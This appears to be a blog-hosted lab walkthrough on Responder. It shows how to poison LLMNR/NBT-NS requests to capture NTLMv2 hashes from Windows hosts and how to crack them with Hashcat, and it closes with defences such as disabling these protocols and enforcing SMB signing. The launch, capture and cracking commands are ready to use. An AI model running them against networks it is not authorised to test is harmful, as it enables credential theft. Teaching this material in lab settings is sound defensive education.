---
title: Capturing Password Hashes with Responder
date: 2024-01-15 08:01:35 +0300
subtitle: Product Design
image: '/images/815.png'
---
# Capturing Password Hashes with Responder

## **Objective**
Learn how to use **Responder**, a powerful tool for LLMNR, NBT-NS, and MDNS poisoning, to capture password hashes on a network. Understand the process of analyzing captured hashes and how to secure networks against such attacks.

---

## **Purpose**
Responder exploits insecure network protocols like LLMNR (Link-Local Multicast Name Resolution) and NetBIOS Name Service (NBT-NS), which are enabled by default in many Windows environments. By intercepting requests, Responder can capture hashed credentials, which attackers can later attempt to crack.

---

## **Tools Required**
- **Kali Linux**: Running Responder.
- A Windows machine or network with LLMNR or NBT-NS enabled (test environment).

---

## **Lab Topology**
- **Kali Linux**: Hosting Responder.
- **Windows Machine**: A client machine sending LLMNR or NBT-NS requests.

---

## **Walkthrough**

### **Task 1: Setting Up Responder**
1. **Verify Responder Installation**:
   - Responder is pre-installed on Kali Linux. To check:
     ```bash
     responder -h
     ```
   - If not installed, install it with:
     ```bash
     sudo apt update && sudo apt install responder -y
     ```

2. **Navigate to Responder Directory**:
   ```bash
   cd /usr/share/responder
   ```

---

### **Task 2: Starting Responder**
1. **Identify Your Network Interface**:
   - Use `ip a` to list network interfaces.
   - Note the interface connected to the target network (e.g., `eth0`, `wlan0`).

2. **Launch Responder**:
   - Run Responder with your network interface:
     ```bash
     sudo responder -I <interface>
     ```
     Replace `<interface>` with your network interface (e.g., `eth0`).

3. **Monitor Responder Output**:
   - Responder will start listening for LLMNR, NBT-NS, and MDNS requests.
   - Example output:
     ```
     [NBT-NS] Poisoned answer sent to 192.168.1.5 for name WORKGROUP
     [HTTP] NTLMv2 hash captured from 192.168.1.5
     ```

---

### **Task 3: Triggering Hash Capture**
1. **Simulate a Network Request**:
   - From the Windows machine, try to access a non-existent share:
     ```
     \nonexistent
     ```
   - This triggers an LLMNR or NBT-NS query.

2. **Observe Captured Hashes**:
   - Responder logs will display captured NTLMv2 hashes.
   - Example hash:
     ```
     Administrator::WORKGROUP:1122334455667788:5c2ee2f4458b76b99e76d9e3cfb7c3a2:01010000000000000090b2f7c7...
     ```

---

### **Task 4: Cracking Captured Hashes**
1. **Save the Captured Hash**:
   - Open the `Responder` directory and find the hashes in the `logs/` folder.
   - Example:
     ```bash
     cd logs/
     cat Responder-Session.log
     ```

2. **Use Hashcat to Crack the Hash**:
   - Copy the NTLMv2 hash to a file (e.g., `hashes.txt`).
   - Run Hashcat with a wordlist (e.g., `/usr/share/wordlists/rockyou.txt`):
     ```bash
     hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
     ```

3. **Monitor Cracking Progress**:
   - Hashcat will attempt to find the plaintext password for the hash.
   - Example output:
     ```
     5c2ee2f4458b76b99e76d9e3cfb7c3a2:password123
     ```

---

### **Task 5: Securing Against Responder Attacks**
1. **Disable LLMNR and NBT-NS**:
   - On Windows machines:
     - Disable LLMNR via Group Policy:
       - Navigate to **Computer Configuration > Administrative Templates > Network > DNS Client**.
       - Set **Turn off Multicast Name Resolution** to **Enabled**.
     - Disable NBT-NS:
       - Open **Network Adapter Settings** > **IPv4 Properties** > **Advanced** > **WINS** tab.
       - Disable NetBIOS over TCP/IP.

2. **Enable SMB Signing**:
   - Enforce SMB signing to protect against spoofing:
     ```
     Computer Configuration > Policies > Windows Settings > Security Settings > Local Policies > Security Options
     ```
     - Enable **Microsoft network server: Digitally sign communications (always)**.

3. **Monitor Network Traffic**:
   - Use tools like Wireshark to identify suspicious traffic.

4. **Educate Users**:
   - Train users to avoid connecting to unknown shares or clicking suspicious links.

---

## **Best Practices**
1. **Audit Network Configurations**:
   - Regularly review network settings for insecure protocols.

2. **Implement Network Segmentation**:
   - Limit the broadcast domains to reduce exposure to poisoning attacks.

3. **Use Strong Passwords**:
   - Enforce strong password policies to make cracking hashes more difficult.

4. **Regularly Patch Systems**:
   - Ensure systems are updated to fix known vulnerabilities.

---

## **Key Takeaways**
1. Responder exploits insecure network protocols to capture password hashes.
2. Disabling LLMNR and NBT-NS significantly reduces the risk of such attacks.
3. Strong passwords and SMB signing provide additional layers of protection.

---

## **Troubleshooting Tips**
1. **Responder Captures No Traffic**:
   - Verify the correct network interface is selected.
   - Ensure the Windows machine is on the same subnet.

2. **Hashcat Fails to Crack Hash**:
   - Try a larger or more comprehensive wordlist.
   - Use additional rules or hybrid attacks for better results.

3. **Windows Machine Does Not Query**:
   - Ensure LLMNR and NBT-NS are enabled on the target machine.

By completing this lab, you now understand how to use Responder to capture password hashes and secure networks against this attack vector.